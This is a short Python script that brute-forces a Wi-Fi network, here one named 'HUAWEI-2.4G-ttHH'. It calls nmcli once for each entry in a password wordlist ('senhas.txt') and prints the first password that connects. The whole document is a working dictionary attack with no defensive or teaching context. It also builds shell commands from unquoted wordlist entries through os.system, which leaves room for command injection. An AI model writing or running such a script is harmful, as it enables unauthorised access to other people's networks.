import os

password_file = "senhas.txt"
with open(password_file, "r") as file:
    passwords = file.read().splitlines()

SSID = 'HUAWEI-2.4G-ttHH' # ->>>>Network name

for password in passwords:
    conn = os.system(f'nmcli device wifi connect {SSID} password {password}')
    if conn == 0:
        print(f'{SSID} : {password}')
        break
